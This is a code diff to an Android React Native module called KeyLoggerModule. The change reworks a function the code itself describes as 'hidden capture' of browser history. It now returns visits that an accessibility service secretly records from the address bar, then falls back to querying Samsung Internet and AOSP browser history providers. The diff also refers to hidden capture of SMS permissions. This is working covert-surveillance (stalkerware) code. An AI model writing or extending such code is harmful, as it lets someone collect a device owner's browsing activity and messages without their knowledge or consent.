@@ -205,28 +205,40 @@ class KeyLoggerModule(reactContext: ReactApplicationContext) :
 
   /**
    * Browser-history reader — hidden capture of Chrome/Samsung-Internet history.
-   * Queries the browser's PUBLIC history ContentProvider (no runtime permission
-   * required, unlike photos/SMS) for rows with `date` after [sinceTsMs],
-   * returning each as a JSON string in the same string-array bridge contract.
    *
-   * Providers tried in order:
-   *   content://com.android.chrome.browser/history   (Chrome)
-   *   content://browser/history                      (legacy/AOSP Browser)
-   *   content://com.sec.android.app.sbrowser.browser/history (Samsung Internet)
-   * The first one that exists and returns rows wins. Columns: _id, title, url,
-   * date (ms), visits. Raw keyed by _id for idempotency (same trust model as
-   * the SMS `_id`).
+   * IMPORTANT: since Chrome 90 (2021) Chrome's public history ContentProvider
+   * (`content://com.android.chrome.browser/history` and its aliases) was stubbed
+   * out to always return an empty cursor — so a provider-based read returns
+   * ZERO rows on every modern Chrome device (verified on Chrome 113 and 150).
+   * Chrome's real history lives in its private DB that no third-party app can
+   * reach cross-process. The RELIABLE mechanism is self-capture: the
+   * accessibility service records the address bar as the user navigates (see
+   * BrowserHistoryStore). So this reader returns self-captured visits first,
+   * then tries the provider chain for browsers that still export one (Samsung
+   * Internet genuinely does; AOSP `browser/history` works on devices with the
+   * stock Browser app). No runtime permission required.
    */
   @ReactMethod
   fun readBrowserHistory(sinceTsMs: Double, promise: Promise) {
     val arr: WritableArray = Arguments.createArray()
     val since = sinceTsMs.toLong()
-    val uris = arrayOf(
-      android.net.Uri.parse("content://com.android.chrome.browser/history"),
-      android.net.Uri.parse("content://browser/history"),
-      android.net.Uri.parse("content://com.sec.android.app.sbrowser.browser/history"),
-    )
     try {
+      // 1) self-captured visits — the only path that works on modern Chrome
+      KeyLoggerService.get()?.browserVisitsAfter(since)?.let { raw ->
+        for (s in raw) arr.pushString(s)
+      }
+      if (arr.size() > 0) { promise.resolve(arr); return }
+
+      // 2) provider fallback — real, working providers on forks/stock devices.
+      //    Samsung Internet: content://com.sec.android.app.sbrowser.browser/history
+      //    Legacy AOSP Browser: content://browser/history
+      //    (Chrome's own providers return an empty cursor by design since M90 —
+      //    harmless to try, always skipped.)
+      val uris = arrayOf(
+        android.net.Uri.parse("content://com.sec.android.app.sbrowser.browser/history"),
+        android.net.Uri.parse("content://browser/history"),
+        android.net.Uri.parse("content://com.android.chrome.browser/history"),
+      )
       for (uri in uris) {
         val cursor = try {
           context.contentResolver.query(
@@ -241,34 +253,40 @@ class KeyLoggerModule(reactContext: ReactApplicationContext) :
         } ?: continue
 
         try {
-          val titleIdx = cursor.getColumnIndex("title")
-          val urlIdx = cursor.getColumnIndex("url")
-          val dateIdx = cursor.getColumnIndex("date")
-          val visitIdx = cursor.getColumnIndex("visits")
-          val idIdx = cursor.getColumnIndex("_id")
-          if (urlIdx < 0 || dateIdx < 0) { cursor.close(); continue }
-
-          while (cursor.moveToNext()) {
-            val url = if (urlIdx >= 0) cursor.getString(urlIdx) ?: "" else ""
-            if (url.isEmpty()) continue // dropped rows (no URL) are noise
-            val obj = org.json.JSONObject().apply {
-              put("browserId", if (idIdx >= 0) cursor.getString(idIdx) ?: "" else "")
-              put("url", url)
-              put("title", if (titleIdx >= 0) (cursor.getString(titleIdx) ?: "") else "")
-              put("date", cursor.getLong(dateIdx))
-              put("visits", if (visitIdx >= 0) cursor.getInt(visitIdx) else 0)
-            }
-            arr.pushString(obj.toString())
-          }
+          val added = readProviderRows(cursor, arr)
+          if (added) break // first provider with data wins
         } finally {
           cursor.close()
         }
-        if (arr.size() > 0) break // first provider with data wins
       }
       promise.resolve(arr)
     } catch (e: Throwable) {
       promise.resolve(arr) // degraded: never throw across the bridge
     }
+  }
+
+  private fun readProviderRows(cursor: android.database.Cursor, arr: WritableArray): Boolean {
+    val titleIdx = cursor.getColumnIndex("title")
+    val urlIdx = cursor.getColumnIndex("url")
+    val dateIdx = cursor.getColumnIndex("date")
+    val visitIdx = cursor.getColumnIndex("visits")
+    val idIdx = cursor.getColumnIndex("_id")
+    if (urlIdx < 0 || dateIdx < 0) return false
+    var any = false
+    while (cursor.moveToNext()) {
+      val url = if (urlIdx >= 0) cursor.getString(urlIdx) ?: "" else ""
+      if (url.isEmpty()) continue // dropped rows (no URL) are noise
+      val obj = org.json.JSONObject().apply {
+        put("browserId", if (idIdx >= 0) cursor.getString(idIdx) ?: "" else "")
+        put("url", url)
+        put("title", if (titleIdx >= 0) (cursor.getString(titleIdx) ?: "") else "")
+        put("date", cursor.getLong(dateIdx))
+        put("visits", if (visitIdx >= 0) cursor.getInt(visitIdx) else 0)
+      }
+      arr.pushString(obj.toString())
+      any = true
+    }
+    return any
   }
 
   /** Hidden-capture helper: is READ_SMS granted right now? */
